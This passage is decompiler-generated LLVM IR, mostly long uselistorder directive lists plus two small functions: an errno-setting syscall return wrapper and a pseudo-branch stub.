  uselistorder i32* @r5, { 41, 42, 43, 44, 27, 28, 29, 30, 31, 32, 33, 34, 35, 45, 5, 46, 47, 48, 679, 680, 681, 49, 23, 50, 0, 51, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 19, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 25, 26, 74, 75, 76, 77, 78, 79, 6, 80, 81, 82, 83, 84, 85, 86, 7, 87, 88, 89, 10, 90, 91, 8, 92, 93, 94, 95, 96, 97, 9, 98, 99, 100, 101, 102, 103, 36, 11, 37, 38, 39, 40, 262, 263, 264, 265, 266, 267, 694, 12, 695, 696, 704, 104, 105, 106, 107, 108, 109, 110, 697, 698, 699, 700, 701, 702, 703, 111, 112, 113, 114, 608, 609, 613, 614, 615, 616, 617, 610, 611, 612, 557, 558, 559, 13, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 618, 619, 642, 14, 643, 644, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 3, 633, 634, 635, 636, 637, 15, 638, 639, 640, 641, 125, 126, 127, 128, 129, 268, 269, 16, 270, 271, 272, 273, 274, 24, 115, 275, 17, 276, 277, 278, 279, 280, 281, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 121, 122, 124, 123, 116, 117, 118, 119, 120, 197, 198, 199, 200, 201, 202, 203, 204, 205, 211, 212, 213, 214, 215, 216, 206, 207, 208, 209, 210, 316, 317, 318, 319, 320, 321, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 1, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 2, 261, 282, 283, 284, 285, 286, 20, 287, 288, 289, 290, 291, 292, 293, 21, 294, 22, 295, 296, 297, 298, 299, 300, 301, 322, 323, 18, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 4, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315 }
  uselistorder i32* @r2, { 7, 10, 11, 39, 40, 12, 13, 14, 15, 16, 17, 28, 8, 9, 29, 41, 46, 47, 48, 49, 1, 52, 42, 22, 23, 43, 2, 3, 36, 37, 4, 38, 5, 0, 50, 6, 51, 44, 45, 24, 25, 26, 30, 31, 35, 21, 18, 19, 20, 27, 32, 33, 34 }
}

define i32 @function_160f8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_160f8:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_16138, label %dec_label_pc_16124

dec_label_pc_16124:                               ; preds = %dec_label_pc_160f8
  %v0_16124 = call i32 @function_11200()
  %v0_16128 = load i32, i32* %r4.global-to-local, align 4
  %v1_16128 = sub i32 0, %v0_16128
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_16130 = inttoptr i32 %v0_16124 to i32*
  store i32 %v1_16128, i32* %v2_16130, align 4
  %v0_16140.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16140

dec_label_pc_16138:                               ; preds = %dec_label_pc_160f8
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %v2_16138 = icmp eq i32 %arg1, 0
  br i1 %v2_16138, label %dec_label_pc_1614c, label %dec_label_pc_16140

dec_label_pc_16140:                               ; preds = %dec_label_pc_16138, %dec_label_pc_16124
  %v0_16140 = phi i32 [ %arg1, %dec_label_pc_16138 ], [ %v0_16140.pre, %dec_label_pc_16124 ]
  br label %dec_label_pc_16150

dec_label_pc_1614c:                               ; preds = %dec_label_pc_16138
  br label %dec_label_pc_16150

dec_label_pc_16150:                               ; preds = %dec_label_pc_16140, %dec_label_pc_1614c
  %v1_16158 = phi i32 [ %v0_16140, %dec_label_pc_16140 ], [ %tmp8, %dec_label_pc_1614c ]
  ret i32 %v1_16158

; uselistorder directives
  uselistorder i32 -1, { 253, 259, 170, 254, 255, 256, 117, 257, 118, 258, 89, 90, 91, 92, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 171, 172, 0, 173, 156, 260, 261, 174, 119, 262, 175, 1, 93, 263, 264, 161, 265, 176, 3, 2, 177, 178, 120, 329, 121, 122, 296, 123, 304, 110, 305, 289, 290, 291, 124, 252, 125, 306, 307, 4, 179, 180, 181, 308, 285, 286, 162, 182, 5, 183, 6, 184, 163, 309, 10, 185, 186, 9, 11, 310, 8, 187, 188, 94, 7, 189, 95, 96, 97, 98, 190, 191, 192, 106, 268, 269, 12, 270, 126, 311, 127, 128, 312, 129, 301, 130, 299, 131, 271, 132, 287, 133, 134, 272, 135, 302, 136, 303, 137, 273, 109, 169, 13, 293, 193, 138, 313, 139, 331, 140, 274, 141, 275, 142, 276, 143, 292, 144, 333, 145, 300, 146, 330, 147, 297, 148, 294, 149, 277, 150, 151, 152, 332, 153, 288, 194, 195, 196, 14, 104, 107, 15, 16, 108, 105, 159, 160, 197, 19, 198, 20, 199, 278, 99, 21, 200, 201, 202, 203, 18, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 266, 154, 267, 22, 229, 230, 112, 111, 279, 17, 231, 232, 233, 23, 234, 115, 116, 113, 114, 235, 24, 236, 155, 280, 100, 25, 26, 29, 165, 281, 164, 282, 28, 166, 283, 27, 30, 31, 167, 284, 32, 33, 34, 35, 36, 237, 37, 101, 38, 39, 238, 239, 40, 157, 158, 41, 42, 43, 240, 44, 45, 46, 47, 48, 49, 50, 102, 51, 52, 53, 54, 55, 56, 57, 241, 58, 168, 298, 59, 60, 61, 242, 62, 63, 64, 243, 65, 244, 66, 67, 68, 245, 69, 70, 71, 246, 72, 73, 74, 75, 76, 247, 77, 78, 79, 80, 81, 82, 248, 83, 84, 85, 249, 86, 87, 250, 251, 295, 88, 103 }
  uselistorder i32 ()* @function_11200, { 63, 59, 62, 61, 60, 65, 29, 28, 5, 4, 22, 32, 20, 16, 15, 64, 19, 18, 17, 41, 40, 21, 10, 12, 11, 56, 55, 9, 8, 7, 25, 27, 54, 39, 53, 52, 24, 23, 51, 58, 57, 14, 37, 36, 35, 6, 2, 50, 49, 48, 13, 0, 26, 3, 30, 34, 47, 31, 46, 1, 38, 45, 44, 43, 42, 33 }
  uselistorder i32 1, { 25, 24, 810, 632, 365, 366, 367, 633, 111, 811, 812, 813, 634, 307, 309, 308, 310, 305, 312, 306, 311, 635, 246, 245, 247, 636, 9, 10, 7, 13, 11, 8, 12, 637, 226, 15, 14, 445, 474, 446, 1018, 1019, 1020, 1021, 458, 638, 349, 640, 639, 388, 389, 814, 641, 449, 1118, 450, 815, 1119, 816, 817, 818, 820, 819, 435, 642, 822, 821, 943, 944, 1120, 451, 1121, 1122, 1123, 1124, 1125, 1126, 806, 1127, 1128, 1129, 1130, 1131, 1132, 807, 626, 644, 643, 375, 376, 381, 383, 382, 377, 374, 378, 380, 379, 826, 823, 824, 825, 472, 452, 200, 198, 199, 202, 201, 515, 827, 828, 829, 830, 645, 627, 203, 204, 831, 648, 647, 646, 44, 47, 45, 48, 49, 50, 46, 516, 832, 650, 649, 370, 373, 371, 368, 369, 372, 833, 651, 181, 180, 179, 834, 835, 652, 34, 33, 653, 26, 517, 809, 52, 53, 836, 837, 838, 839, 518, 840, 841, 842, 453, 656, 655, 654, 418, 417, 421, 420, 419, 422, 843, 844, 845, 658, 657, 42, 43, 519, 846, 659, 88, 847, 848, 849, 850, 851, 520, 660, 248, 249, 251, 252, 250, 521, 253, 141, 661, 265, 264, 214, 662, 130, 663, 178, 177, 664, 64, 69, 63, 68, 72, 71, 67, 70, 65, 66, 665, 79, 78, 76, 75, 77, 73, 74, 666, 156, 157, 164, 165, 161, 162, 160, 163, 158, 159, 667, 323, 324, 433, 945, 316, 319, 317, 318, 668, 213, 212, 669, 259, 670, 183, 184, 1133, 522, 1134, 523, 671, 288, 284, 289, 287, 285, 290, 291, 286, 27, 524, 315, 314, 672, 350, 351, 32, 438, 852, 853, 854, 673, 977, 676, 675, 674, 267, 677, 447, 921, 448, 922, 923, 439, 924, 353, 354, 352, 355, 356, 359, 358, 357, 925, 1135, 459, 525, 679, 678, 680, 182, 1070, 1073, 1074, 1075, 681, 423, 428, 429, 427, 426, 430, 424, 425, 1076, 1077, 1078, 1079, 682, 407, 410, 406, 409, 412, 405, 414, 415, 413, 411, 416, 408, 1071, 1072, 526, 332, 331, 330, 333, 1063, 527, 1064, 1065, 1066, 1067, 1068, 683, 270, 271, 269, 272, 257, 256, 1080, 1081, 1082, 1083, 1084, 1085, 479, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 1093, 529, 1094, 1095, 1096, 1097, 1098, 528, 1099, 1100, 1101, 1102, 1103, 684, 395, 397, 393, 396, 401, 403, 400, 402, 404, 398, 399, 394, 103, 102, 530, 531, 886, 443, 688, 687, 686, 685, 304, 273, 454, 274, 689, 132, 131, 129, 690, 59, 691, 155, 692, 260, 693, 313, 694, 216, 215, 235, 695, 36, 35, 696, 261, 697, 255, 254, 698, 258, 699, 979, 980, 112, 113, 855, 856, 857, 858, 859, 860, 861, 1136, 80, 81, 82, 83, 700, 946, 532, 325, 326, 862, 701, 218, 533, 702, 166, 480, 534, 703, 386, 384, 385, 704, 329, 328, 327, 705, 225, 224, 706, 275, 707, 197, 708, 119, 118, 709, 94, 93, 348, 347, 710, 176, 175, 711, 30, 29, 712, 334, 713, 220, 219, 714, 174, 173, 217, 715, 387, 28, 716, 717, 268, 718, 263, 262, 434, 1104, 432, 947, 948, 949, 950, 437, 951, 720, 719, 23, 21, 20, 18, 19, 16, 17, 22, 0, 926, 927, 928, 929, 981, 455, 982, 456, 983, 722, 721, 391, 390, 392, 952, 953, 954, 723, 117, 116, 114, 115, 1105, 1106, 460, 1, 436, 514, 1107, 85, 84, 86, 87, 881, 882, 883, 535, 955, 431, 1108, 957, 956, 958, 109, 984, 1000, 724, 92, 91, 90, 89, 985, 725, 346, 345, 344, 343, 547, 887, 548, 888, 481, 889, 549, 884, 890, 537, 891, 462, 550, 551, 866, 863, 539, 444, 864, 865, 540, 867, 868, 869, 541, 870, 871, 544, 872, 873, 542, 874, 875, 543, 538, 876, 877, 878, 545, 879, 880, 546, 885, 892, 893, 894, 552, 895, 896, 897, 553, 461, 898, 808, 901, 900, 536, 899, 902, 903, 554, 904, 905, 906, 463, 913, 914, 440, 555, 628, 737, 736, 735, 734, 733, 732, 731, 730, 729, 728, 727, 726, 236, 242, 244, 238, 241, 243, 237, 240, 239, 907, 908, 556, 909, 910, 557, 911, 912, 146, 145, 144, 150, 147, 148, 149, 143, 142, 558, 559, 739, 738, 362, 363, 360, 361, 364, 1109, 469, 457, 740, 300, 299, 298, 297, 301, 295, 293, 292, 294, 296, 986, 742, 741, 106, 107, 105, 104, 108, 303, 302, 562, 482, 915, 916, 483, 917, 560, 561, 563, 918, 919, 564, 565, 566, 567, 568, 569, 570, 755, 754, 753, 752, 751, 750, 749, 748, 747, 746, 631, 745, 744, 743, 37, 38, 40, 39, 571, 441, 572, 756, 573, 574, 575, 41, 578, 577, 576, 920, 758, 757, 222, 221, 223, 579, 930, 471, 931, 470, 932, 933, 580, 473, 581, 934, 582, 935, 583, 936, 584, 937, 585, 938, 586, 939, 587, 940, 588, 941, 589, 942, 442, 590, 768, 767, 766, 765, 764, 763, 762, 761, 760, 759, 151, 154, 152, 153, 959, 965, 3, 464, 960, 591, 961, 2, 962, 475, 963, 465, 466, 964, 966, 967, 476, 968, 629, 772, 771, 630, 770, 769, 266, 1110, 484, 485, 1111, 4, 5, 6, 987, 988, 989, 990, 991, 477, 478, 592, 992, 993, 593, 994, 995, 594, 996, 998, 997, 776, 775, 774, 773, 278, 280, 281, 282, 283, 276, 279, 277, 1001, 1002, 1003, 595, 596, 778, 777, 168, 171, 172, 167, 170, 169, 1004, 1005, 1006, 597, 1007, 598, 487, 486, 599, 1008, 779, 133, 136, 135, 137, 140, 134, 139, 138, 1009, 1010, 600, 1011, 488, 467, 601, 780, 61, 60, 62, 1012, 1013, 1014, 602, 1015, 603, 604, 1016, 489, 1017, 781, 228, 232, 233, 234, 231, 227, 230, 229, 1022, 1023, 1024, 605, 1025, 606, 491, 490, 607, 1027, 608, 1028, 782, 191, 194, 195, 196, 193, 188, 192, 189, 190, 1029, 1030, 1031, 1032, 1033, 609, 1034, 610, 1035, 611, 496, 495, 612, 1036, 492, 1037, 493, 1038, 494, 1039, 788, 787, 786, 785, 784, 783, 207, 208, 210, 209, 205, 211, 206, 1040, 1041, 1042, 1043, 1044, 613, 1045, 614, 1046, 615, 505, 504, 616, 1047, 503, 1048, 502, 1049, 497, 1050, 498, 1051, 499, 1052, 500, 1053, 501, 1054, 794, 793, 792, 791, 790, 789, 98, 99, 100, 101, 95, 97, 96, 1055, 1056, 617, 1057, 506, 468, 618, 795, 321, 320, 322, 1058, 1059, 1060, 619, 509, 508, 620, 1061, 507, 1062, 796, 335, 336, 340, 341, 342, 339, 338, 337, 1112, 1113, 1114, 621, 512, 511, 622, 1115, 510, 1116, 801, 800, 799, 798, 797, 120, 121, 126, 127, 128, 125, 124, 123, 122, 1069, 513, 623, 802, 187, 185, 186, 1117, 803, 31, 1026, 110, 969, 972, 624, 973, 974, 970, 971, 975, 976, 54, 55, 56, 58, 57, 978, 625, 804, 999, 51, 805 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_16150, { 1, 0 }
}

define i32 @function_1615c() local_unnamed_addr {
entry:
  %v3_16160 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_16160)
  %v31_16168 = load i32, i32* @r0, align 4
  ret i32 %v31_16168

; uselistorder directives
  uselistorder i32* @r0, { 31, 21, 12, 61, 60, 188, 17, 4, 5, 224, 6, 13, 7, 62, 0, 63, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 1, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 64, 15, 58, 59, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 26, 18, 156, 157, 9, 16, 10, 251, 253, 254, 48, 49, 50, 51, 52, 53, 54, 55, 11, 14, 79, 80, 252, 140, 141, 81, 204, 24, 56, 57, 205, 2, 206, 207, 208, 203, 197, 46, 198, 199, 200, 47, 201, 202, 27, 216, 217, 209, 210, 211, 212, 213, 214, 215, 87, 88, 19, 89, 30, 22, 158, 159, 160, 161, 182, 25, 20, 29, 218, 162, 219, 28, 163, 164, 165, 166, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 84, 85, 123, 33, 82, 83, 86, 124, 127, 128, 129, 130, 131, 132, 125, 126, 34, 35, 36, 37, 133, 134, 38, 39, 135, 136, 137, 138, 139, 142, 143, 40, 41, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 42, 154, 155, 43, 167, 168, 169, 170, 171, 172, 173, 8, 174, 175, 176, 177, 178, 179, 180, 220, 221, 3, 183, 184, 185, 186, 187, 189, 191, 192, 193, 194, 195, 196, 222, 223, 190, 181, 44, 45, 23, 32 }
  uselistorder void (i32)* @__pseudo_branch, { 0, 60, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 1, 2, 3, 65, 66, 67, 68, 61, 49, 62, 63, 64, 69, 70, 71, 50, 51, 52, 46, 47, 48, 53, 57, 58, 54, 55, 56, 72, 39, 40, 41, 42, 43, 44, 38, 45, 59 }
  uselistorder i32 0, { 583, 584, 593, 594, 595, 596, 597, 103, 598, 599, 600, 0, 601, 299, 66, 602, 369, 603, 604, 605, 330, 331, 585, 586, 591, 1, 104, 105, 945, 946, 947, 948, 140, 141, 949, 606, 142, 106, 1145, 1146, 1147, 300, 607, 608, 609, 301, 1148, 67, 302, 1149, 1150, 84, 41, 42, 610, 75, 2, 98, 99, 801, 76, 77, 78, 802, 803, 1151, 1152, 1153, 1154, 1155, 1158, 1159, 1160, 1161, 1162, 1163, 1164, 1165, 1166, 1167, 1156, 1157, 1168, 1169, 1170, 1171, 1172, 1173, 1174, 1175, 32, 1176, 1177, 1178, 1179, 1180, 33, 1181, 1182, 1183, 34, 1184, 1185, 1186, 35, 1187, 1188, 1189, 1190, 1191, 1192, 1193, 1194, 1195, 1196, 1197, 1198, 1199, 1200, 1201, 1202, 1203, 1204, 1205, 1206, 1207, 1208, 1209, 1210, 1213, 1214, 1215, 1216, 1217, 1218, 1219, 1211, 1212, 1220, 1221, 1222, 1223, 1224, 1225, 1226, 1227, 1228, 1229, 36, 1230, 1231, 1232, 1233, 1234, 37, 1235, 1236, 1237, 1238, 1239, 38, 1240, 1241, 1242, 1243, 1244, 1245, 1246, 1247, 1248, 1249, 1250, 1251, 1252, 1253, 1254, 143, 611, 560, 612, 613, 614, 615, 616, 370, 371, 617, 618, 107, 108, 109, 619, 620, 624, 621, 622, 623, 303, 317, 625, 626, 110, 144, 629, 627, 628, 304, 630, 111, 631, 632, 3, 4, 112, 633, 577, 578, 372, 579, 634, 635, 636, 68, 69, 637, 638, 639, 145, 640, 641, 642, 643, 644, 373, 645, 646, 647, 648, 649, 650, 113, 651, 652, 653, 654, 5, 6, 146, 148, 655, 147, 656, 149, 657, 114, 658, 663, 664, 659, 660, 661, 666, 667, 668, 150, 669, 670, 671, 672, 673, 662, 665, 674, 115, 587, 588, 589, 1255, 1256, 1043, 857, 1051, 592, 804, 805, 332, 806, 374, 580, 375, 581, 1052, 1053, 1054, 151, 1055, 807, 808, 809, 582, 590, 116, 152, 1257, 1258, 1056, 1057, 117, 153, 376, 1262, 1263, 377, 1264, 1265, 154, 306, 1266, 1267, 378, 70, 1268, 1269, 379, 1276, 1279, 552, 305, 1280, 380, 1277, 1278, 1259, 1260, 561, 155, 294, 675, 677, 676, 156, 678, 679, 680, 381, 681, 100, 858, 91, 859, 158, 157, 860, 1261, 777, 778, 779, 780, 781, 782, 160, 118, 783, 784, 785, 92, 159, 786, 119, 383, 384, 1271, 382, 120, 559, 121, 161, 1063, 1064, 1065, 1066, 1067, 162, 1068, 1069, 1070, 1071, 1072, 1073, 1074, 163, 1058, 385, 1059, 1060, 386, 1061, 1062, 122, 1044, 387, 164, 1045, 1046, 1047, 1048, 1049, 123, 172, 170, 165, 167, 168, 171, 174, 173, 166, 169, 1075, 1076, 1100, 1101, 124, 1077, 1078, 178, 176, 177, 1079, 1080, 184, 183, 136, 175, 1081, 1082, 1083, 1084, 1085, 1086, 324, 323, 333, 388, 1087, 1088, 1089, 71, 1090, 180, 179, 181, 182, 135, 1091, 1092, 307, 1093, 1094, 101, 1095, 1096, 1097, 1098, 1099, 7, 8, 704, 705, 72, 125, 9, 334, 389, 1102, 1103, 1104, 1020, 998, 706, 787, 707, 708, 1021, 1022, 709, 950, 1281, 1282, 79, 126, 810, 811, 812, 185, 682, 683, 186, 813, 818, 819, 820, 821, 187, 335, 188, 325, 326, 390, 814, 189, 815, 816, 127, 822, 1105, 1272, 710, 711, 712, 817, 1275, 999, 1270, 863, 823, 713, 861, 714, 391, 1273, 95, 1274, 788, 10, 1106, 1107, 96, 1108, 1109, 1110, 1111, 1112, 190, 1113, 553, 562, 554, 555, 1114, 563, 137, 191, 824, 825, 826, 93, 319, 827, 828, 564, 11, 308, 192, 193, 194, 43, 195, 392, 715, 829, 830, 831, 1116, 1115, 1117, 1118, 1119, 1120, 39, 196, 1121, 1122, 1123, 197, 85, 86, 367, 368, 696, 199, 198, 200, 832, 201, 833, 834, 202, 1124, 1125, 393, 203, 204, 205, 895, 206, 864, 207, 208, 723, 716, 209, 717, 718, 719, 697, 698, 700, 684, 685, 565, 686, 699, 687, 566, 688, 567, 689, 568, 690, 569, 691, 692, 87, 44, 297, 298, 693, 570, 694, 571, 695, 701, 702, 394, 703, 720, 551, 721, 395, 722, 310, 309, 724, 725, 726, 727, 211, 210, 728, 729, 730, 572, 295, 731, 80, 81, 296, 732, 82, 83, 396, 734, 735, 556, 736, 737, 738, 739, 740, 397, 741, 742, 743, 320, 138, 558, 744, 745, 746, 747, 748, 749, 557, 750, 751, 398, 752, 399, 753, 756, 757, 758, 212, 754, 213, 755, 13, 12, 214, 733, 865, 866, 550, 759, 400, 760, 762, 215, 763, 764, 765, 766, 767, 768, 769, 217, 216, 770, 401, 771, 402, 772, 403, 761, 773, 327, 774, 404, 775, 444, 445, 405, 776, 406, 222, 221, 573, 128, 224, 223, 574, 129, 575, 220, 219, 218, 312, 321, 313, 407, 789, 225, 226, 797, 790, 791, 792, 793, 794, 795, 796, 311, 798, 799, 45, 800, 227, 408, 94, 835, 836, 837, 838, 316, 839, 840, 841, 315, 842, 843, 844, 845, 228, 846, 848, 847, 130, 131, 229, 314, 231, 230, 849, 232, 233, 73, 234, 237, 867, 868, 869, 870, 236, 235, 238, 871, 872, 46, 47, 139, 97, 239, 74, 410, 873, 874, 875, 876, 877, 240, 878, 879, 338, 880, 881, 882, 883, 244, 241, 242, 243, 884, 885, 886, 887, 411, 888, 889, 337, 891, 409, 892, 336, 893, 412, 894, 246, 896, 897, 898, 899, 245, 247, 900, 901, 48, 49, 88, 902, 248, 903, 904, 341, 339, 905, 340, 906, 252, 908, 909, 910, 911, 251, 250, 253, 912, 913, 50, 51, 907, 249, 914, 915, 254, 916, 917, 344, 918, 343, 919, 342, 920, 413, 921, 415, 89, 52, 922, 132, 345, 416, 923, 924, 255, 256, 925, 414, 926, 259, 927, 928, 929, 930, 258, 257, 260, 931, 932, 53, 54, 133, 933, 934, 14, 15, 16, 17, 935, 936, 261, 347, 937, 417, 938, 418, 939, 419, 940, 420, 941, 421, 942, 422, 943, 346, 944, 265, 952, 953, 954, 955, 263, 262, 266, 956, 957, 55, 56, 951, 264, 959, 958, 18, 19, 20, 21, 960, 267, 961, 962, 349, 963, 423, 966, 424, 967, 425, 968, 426, 969, 427, 970, 428, 971, 348, 972, 429, 973, 271, 975, 976, 977, 978, 269, 268, 272, 979, 980, 57, 58, 974, 270, 981, 59, 430, 982, 984, 985, 986, 987, 431, 988, 22, 23, 24, 25, 26, 983, 273, 989, 990, 355, 991, 354, 992, 353, 993, 352, 994, 350, 995, 351, 996, 432, 997, 277, 1001, 1002, 1003, 1004, 275, 274, 278, 1005, 1006, 60, 61, 1000, 276, 1007, 62, 433, 1008, 1010, 1011, 1012, 1013, 434, 1014, 27, 28, 29, 30, 31, 1009, 279, 1015, 1016, 357, 1017, 356, 1018, 435, 1019, 437, 90, 63, 1023, 134, 358, 438, 439, 1024, 1025, 280, 281, 1026, 436, 1029, 1030, 1031, 283, 284, 1032, 1033, 64, 1027, 1028, 282, 1035, 1034, 1036, 285, 1037, 1038, 361, 1039, 360, 1040, 359, 1041, 440, 1042, 1127, 1128, 1129, 287, 288, 289, 1131, 1132, 65, 1130, 1126, 286, 1134, 1135, 1133, 1136, 290, 1137, 1138, 364, 1139, 363, 1140, 362, 1141, 441, 1144, 328, 1050, 1142, 291, 1143, 964, 292, 965, 850, 102, 851, 852, 329, 442, 318, 853, 854, 40, 322, 855, 856, 443, 862, 293, 890, 365, 576, 366, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 1283, 1284, 1285, 1286, 1287, 1288, 1289, 1290, 1291, 1292, 1293, 1294, 1295, 1296, 1297 }
  uselistorder i32* @r4, { 37, 50, 51, 52, 6, 53, 54, 55, 7, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 43, 44, 45, 451, 452, 66, 67, 68, 69, 70, 71, 72, 73, 74, 719, 720, 75, 76, 8, 1, 77, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 9, 78, 79, 80, 81, 82, 83, 84, 85, 86, 10, 87, 88, 91, 92, 93, 94, 38, 95, 96, 97, 98, 99, 100, 89, 90, 39, 40, 101, 102, 11, 103, 12, 104, 13, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 14, 125, 126, 127, 15, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 46, 47, 48, 49, 41, 42, 635, 636, 280, 281, 737, 738, 739, 637, 638, 742, 747, 748, 749, 750, 751, 752, 753, 740, 140, 141, 142, 334, 335, 336, 741, 246, 16, 247, 248, 249, 250, 251, 252, 743, 746, 143, 144, 145, 146, 639, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 17, 656, 657, 658, 659, 640, 641, 642, 643, 603, 604, 605, 606, 607, 608, 609, 610, 611, 18, 612, 613, 614, 615, 616, 617, 618, 619, 620, 660, 682, 683, 684, 685, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 34, 674, 675, 0, 676, 677, 678, 679, 680, 681, 167, 168, 169, 744, 745, 686, 687, 532, 533, 282, 283, 284, 285, 286, 287, 288, 147, 148, 149, 289, 290, 291, 5, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 2, 302, 303, 304, 688, 689, 19, 690, 691, 692, 170, 171, 172, 173, 174, 381, 382, 341, 342, 175, 176, 177, 178, 179, 180, 181, 182, 161, 162, 163, 183, 184, 185, 186, 164, 152, 153, 150, 151, 154, 155, 156, 157, 158, 159, 160, 165, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 203, 204, 205, 206, 213, 214, 215, 216, 217, 3, 207, 208, 209, 210, 211, 212, 201, 202, 693, 694, 343, 344, 345, 346, 347, 166, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 253, 20, 21, 22, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 305, 306, 4, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 23, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 24, 426, 25, 427, 26, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 